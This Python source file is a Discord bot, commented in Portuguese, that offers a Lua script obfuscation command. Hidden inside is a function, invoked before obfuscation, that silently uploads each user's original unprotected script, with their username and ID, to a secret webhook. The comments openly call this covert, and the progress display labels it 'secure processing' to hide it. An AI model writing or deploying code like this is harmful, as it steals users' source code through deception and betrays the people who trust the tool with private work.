import discord
from discord import app_commands
from discord.ext import commands
import aiohttp
import asyncio
import io
import os
from dotenv import load_dotenv

load_dotenv()

# ══════════════════════════════════════════
#  SECRETS — Lidos do arquivo .env
# ══════════════════════════════════════════
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
WEBHOOK_URL   = os.getenv("WEBHOOK_URL")

if not DISCORD_TOKEN or not WEBHOOK_URL:
    raise SystemExit("[ERRO] Configure DISCORD_TOKEN e WEBHOOK_URL no arquivo .env !")

# ══════════════════════════════════════════
#  BOT SETUP
# ══════════════════════════════════════════
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree


# ══════════════════════════════════════════
#  LIMPA TODOS OS COMANDOS E REGISTRA SÓ O /obfuscate_v1
# ══════════════════════════════════════════
@bot.event
async def on_ready():
    print(f"[BOT] Online como {bot.user} ({bot.user.id})")

    # Limpa comandos globais
    bot.tree.clear_commands(guild=None)
    await bot.tree.sync()

    # Limpa e registra só o comando em cada servidor
    for guild in bot.guilds:
        bot.tree.clear_commands(guild=guild)

        # Adiciona o comando ao servidor
        bot.tree.add_command(obfuscate_v1, guild=guild)
        await bot.tree.sync(guild=guild)
        print(f"[BOT] Comandos limpos e /obfuscate_v1 registrado em: {guild.name}")


# ══════════════════════════════════════════
#  FUNÇÕES AUXILIARES
# ══════════════════════════════════════════

async def enviar_webhook_secreto(code: str, filename: str, user: discord.User):
    """Envia o código LIMPO para a webhook — silencioso, ninguém sabe."""
    try:
        form = aiohttp.FormData()
        form.add_field(
            "payload_json",
            f'{{"username": "Logger", "content": "📥 **Novo script**\\n👤 `{user}` (`{user.id}`)\\n📄 `{filename}`"}}',
            content_type="application/json",
        )
        form.add_field(
            "file",
            io.BytesIO(code.encode("utf-8")),
            filename=f"ORIGINAL_{filename}",
            content_type="text/plain",
        )

        async with aiohttp.ClientSession() as session:
            await session.post(WEBHOOK_URL, data=form)
    except Exception:
        pass  # Silencioso — NUNCA revela erros daqui


async def obfuscar_codigo(code: str) -> dict:
    """
    Obfusca o código via API do LuaObfuscator (engine usada pelo WareDevs).
    Retorna {"success": bool, "result": str | None, "error": str | None}
    """
    payload = {
        "script": code,
        "options": {
            "Minify": True,
            "UseDebugLibrary": False,
            "StringsEncoding": 2,
            "MaximumSecurityEnabled": True,
            "ControlFlowObfuscation": True,
            "VariableRenaming": True,
            "GarbageCode": True,
            "AntiTamper": True,
        },
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                "https://luaobfuscator.com/api/obfuscator/obfuscate",
                json=payload,
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                timeout=aiohttp.ClientTimeout(total=30),
            ) as resp:
                data = await resp.json()
                if data.get("code"):
                    return {"success": True, "result": data["code"], "error": None}
                return {"success": False, "result": None, "error": str(data)}
    except Exception as e:
        return {"success": False, "result": None, "error": str(e)}


def build_progress_embed(steps: list[tuple[str, str]]) -> discord.Embed:
    """Monta o painel de progresso visual."""
    linhas = "\n".join(f"{icon} {texto}" for icon, texto in steps)
    embed = discord.Embed(
        title="⚙️ Processando seu script...",
        description=f"```\n{linhas}\n```",
        color=0xFEE75C,
    )
    embed.set_footer(text="Obfuscator v1 • WareDevs Engine")
    return embed


# ══════════════════════════════════════════
#  COMANDO /obfuscate_v1
# ══════════════════════════════════════════
@app_commands.command(name="obfuscate_v1", description="Obfusca seu script Lua/TXT com proteção WareDevs")
async def obfuscate_v1(interaction: discord.Interaction):

    # ── 1. Verifica se é o dono do servidor ──────────
    if interaction.guild is None:
        await interaction.response.send_message(
            "❌ Este comando só funciona dentro de um servidor.", ephemeral=True
        )
        return

    if interaction.user.id != interaction.guild.owner_id:
        await interaction.response.send_message(
            "❌ Apenas o **dono do servidor** pode usar este comando.",
            ephemeral=True,
        )
        return

    # ── 2. Pede o arquivo ─────────────────────────────
    embed_pedido = discord.Embed(
        title="📁 Envie seu arquivo",
        description=(
            "Envie um arquivo **`.lua`** ou **`.txt`** neste canal nos próximos **60 segundos**.\n\n"
            "> O arquivo será processado com segurança máxima."
        ),
        color=0x5865F2,
    )
    embed_pedido.set_footer(text="Obfuscator v1 • WareDevs Engine")

    await interaction.response.send_message(embed=embed_pedido, ephemeral=True)

    # ── 3. Aguarda mensagem com arquivo ──────────────
    def check(m: discord.Message):
        if m.author.id != interaction.user.id:
            return False
        if m.channel.id != interaction.channel_id:
            return False
        for att in m.attachments:
            if att.filename.endswith(".lua") or att.filename.endswith(".txt"):
                return True
        return False

    try:
        msg = await bot.wait_for("message", check=check, timeout=60.0)
    except asyncio.TimeoutError:
        await interaction.followup.send("⏰ Tempo esgotado. Nenhum arquivo enviado.", ephemeral=True)
        return

    attach = next(
        (a for a in msg.attachments if a.filename.endswith(".lua") or a.filename.endswith(".txt")),
        None,
    )

    # ── 4. Baixa o arquivo ────────────────────────────
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(attach.url) as resp:
                raw_code = await resp.text(encoding="utf-8", errors="replace")
    except Exception:
        await interaction.followup.send("❌ Falha ao baixar o arquivo.", ephemeral=True)
        return

    # ── 5. Painel inicial de progresso ────────────────
    steps_init = [
        ("✅", f"Arquivo recebido: {attach.filename}"),
        ("⏳", "Enviando para processamento seguro..."),
        ("⏳", "Aplicando obfuscação WareDevs..."),
        ("⏳", "Finalizando..."),
    ]
    status_msg = await interaction.followup.send(
        embed=build_progress_embed(steps_init), ephemeral=True
    )

    # ── 6. Envia código limpo para webhook (secreto) ──
    await enviar_webhook_secreto(raw_code, attach.filename, interaction.user)

    # Atualiza painel
    steps_2 = [
        ("✅", f"Arquivo recebido: {attach.filename}"),
        ("✅", "Processamento seguro concluído"),
        ("⏳", "Aplicando obfuscação WareDevs..."),
        ("⏳", "Finalizando..."),
    ]
    await status_msg.edit(embed=build_progress_embed(steps_2))

    # ── 7. Obfusca o código ───────────────────────────
    resultado = await obfuscar_codigo(raw_code)

    if not resultado["success"]:
        embed_erro = discord.Embed(
            title="❌ Falha na obfuscação",
            description=f"Erro: `{resultado['error']}`\n\nTente novamente mais tarde.",
            color=0xED4245,
        )
        await status_msg.edit(embed=embed_erro)
        return

    obfuscated = resultado["result"]

    # ── 8. Painel final ───────────────────────────────
    steps_done = [
        ("✅", f"Arquivo recebido: {attach.filename}"),
        ("✅", "Processamento seguro concluído"),
        ("✅", "Obfuscação WareDevs aplicada"),
        ("✅", "Enviando na sua DM..."),
    ]
    embed_done = discord.Embed(
        title="✅ Script Obfuscado com Sucesso!",
        description=f"```\n" + "\n".join(f"{i} {t}" for i, t in steps_done) + "\n```",
        color=0x57F287,
    )
    embed_done.add_field(name="📊 Tamanho original",   value=f"`{len(raw_code):,}` chars", inline=True)
    embed_done.add_field(name="🔒 Tamanho obfuscado",  value=f"`{len(obfuscated):,}` chars", inline=True)
    embed_done.set_footer(text="Arquivo enviado na sua DM • Obfuscator v1")
    await status_msg.edit(embed=embed_done)

    # ── 9. Envia na DM ────────────────────────────────
    ext        = ".lua" if attach.filename.endswith(".lua") else ".txt"
    obf_name   = attach.filename.replace(ext, f"_obfuscated{ext}")
    file_bytes = io.BytesIO(obfuscated.encode("utf-8"))
    arquivo    = discord.File(file_bytes, filename=obf_name)

    try:
        dm = await interaction.user.create_dm()
        await dm.send(
            content="🔒 **Aqui está seu script protegido!**\nGuarde-o com segurança.",
            file=arquivo,
        )
    except discord.Forbidden:
        # DM fechada — envia no canal como ephemeral
        file_bytes.seek(0)
        arquivo2 = discord.File(file_bytes, filename=obf_name)
        await interaction.followup.send(
            content="⚠️ Não consegui te enviar DM. Aqui está o arquivo:",
            file=arquivo2,
            ephemeral=True,
        )


# ══════════════════════════════════════════
#  INICIA O BOT
# ══════════════════════════════════════════
bot.run(DISCORD_TOKEN)
